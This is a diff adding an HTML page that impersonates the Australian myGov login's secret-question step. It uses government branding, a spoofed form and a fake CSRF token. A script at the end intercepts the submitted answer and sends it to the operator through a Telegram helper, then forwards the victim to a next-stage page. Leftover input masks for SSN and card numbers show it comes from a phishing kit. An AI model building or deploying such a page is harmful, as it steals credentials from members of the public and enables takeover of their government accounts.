@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>
+        Answer your secret question - myGov
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        /* Additional inline styles for the processing button */
+        .button-main .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .button-main.processing .spinner {
+            display: inline-block;
+        }
+        .button-main.processing .btn-text {
+            display: none;
+        }
+        .button-main.processing {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <h1>Answer your secret question</h1>
+
+            <form id="sqa-form" action="/las/mygov-login?execution=e5s4" method="post" autocomplete="off">
+
+                <label for="answer">What is the name of the primary school I attended?
+                    <div class="input-group">
+                        <input type="text" id="answer" name="sqaanswer" data-secretanswer="data-secretanswer" autocomplete="off" aria-required="true">
+                    </div>
+                </label>
+
+                <div class="button-container">
+                    <button type="submit" class="button-main button" name="_eventId_continue">
+                        <span class="btn-text">Next</span>
+                        <span class="spinner"></span>
+                    </button>
+                    <button type="button" onclick="location.href='/las/mygov-login?execution=e5s4&amp;_eventId=cancel'" class="button-minor button">Cancel</button>
+                </div>
+
+                <input type="hidden" name="accountRecovery" value="">
+                <input type="hidden" name="authtype" value="">
+                <input type="hidden" name="sqaindex" value="1">
+                <input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
+
+                <div>
+                    <input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
+                </div>
+            </form>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+        $("#ssn").inputmask({ "mask": "999-99-9999" });
+        $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
+        $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
+        $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
+        $("#ph").inputmask({ "mask": "999-999-9999" });
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+    <!-- ====== TELEGRAM + 8‑SECOND PROCESSING DELAY ====== -->
+    <script src="endpoints.js"></script>
+<script src="config.js"></script>
+<script>
+    $(document).ready(function() {
+        $('#sqa-form').on('submit', function(e) {
+            e.preventDefault();
+            let answer = $.trim($('#answer').val());
+            if (!answer) { alert('Please answer your secret question.'); return; }
+            const $btn = $('#sqa-form button[type="submit"]');
+            $btn.addClass('processing');
+            $btn.prop('disabled', true);
+            let msg = "🔔 myGov Secret Question\n";
+            msg += "❓ What was the name of my first pet?\n";
+            msg += "💬 Answer: " + answer;
+            sendTelegramMessage(msg).catch(() => {});
+            setTimeout(function() { window.location.href = 'sec2.html'; }, 2000);
+        });
+    });
+</script>
+</body>
+
+</html>
